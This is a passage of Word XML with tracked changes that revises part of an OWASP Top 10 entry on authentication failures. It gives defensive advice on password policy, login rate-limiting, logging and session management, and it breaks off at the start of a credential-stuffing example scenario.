            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> 800-</w:t>
      </w:r>
      <w:del w:id="2626" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>63 B's</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2627" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>63b's</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> guidelines in section 5.1.1 for Memorized Secrets</w:t>
      </w:r>
      <w:del w:id="2628" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>](https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret)</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> or other</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20CBCA58" w14:textId="1FE6A341" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2629" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> modern, evidence</w:t>
      </w:r>
      <w:del w:id="2630" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2631" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>based password policies.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="451E5A46" w14:textId="6E11ABD5" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2632" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2633" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="387A1422" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2634" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2635" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ensure registration, credential recovery, and API pathways are</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E633AFD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2636" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2637" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> hardened against account enumeration attacks by using the same</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FDABF31" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2638" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> messages for all outcomes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05E5BF5A" w14:textId="36FA0590" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2639" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2640" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="59EA9F9C" w14:textId="30B43078" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2641" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2642" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Limit or increasingly delay failed login attempts</w:t>
      </w:r>
      <w:del w:id="2643" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2644" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">, but be careful not to create a </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>denial of service</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> scenario.</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Log all failures</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18F9FB31" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2645" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2646" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and alert administrators when credential stuffing, brute force, or</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49264045" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2647" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> other attacks are detected.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B7C7D1E" w14:textId="0BB42631" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2648" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2649" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="51D8D0DF" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2650" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2651" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Use a server-side, secure, built-in session manager that generates a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05D1E736" w14:textId="1929DAED" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2652" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2653" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> new random session ID with high entropy after login. Session </w:t>
      </w:r>
      <w:del w:id="2654" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>IDs</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2655" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>identifier</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="609FC12E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2656" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2657" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> should not be in the URL, be securely stored</w:t>
      </w:r>
      <w:ins w:id="2658" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and invalidated after</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BC2F53F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2659" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> logout, idle, and absolute timeouts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31477589" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D74E828" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>## Example Attack Scenarios</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28FB02C6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2660" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40A64144" w14:textId="081FA4BB" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2661" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2662" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>**</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Scenario #1</w:t>
      </w:r>
      <w:del w:id="2663" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>: [</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2664" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">:** </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Credential stuffing</w:t>
      </w:r>
      <w:del w:id="2665" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>](https://www.owasp.org/index.php/Credential_stuffing),</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2666" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the use of </w:t>
      </w:r>
      <w:del w:id="2667" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>[</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>lists of known</w:t>
      </w:r>
      <w:del w:id="2668" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4522B7A7" w14:textId="5431ED1C" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2669" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>passwords</w:t>
      </w:r>
      <w:del w:id="2670" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>](https://github.com/danielmiessler/SecLists),</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2671" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is a common attack. </w:t>
      </w:r>
      <w:del w:id="2672" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>If</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2673" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Suppose</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> an application does not implement</w:t>
      </w:r>
      <w:del w:id="2674" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5FEC555C" w14:textId="433B29DD" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2675" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
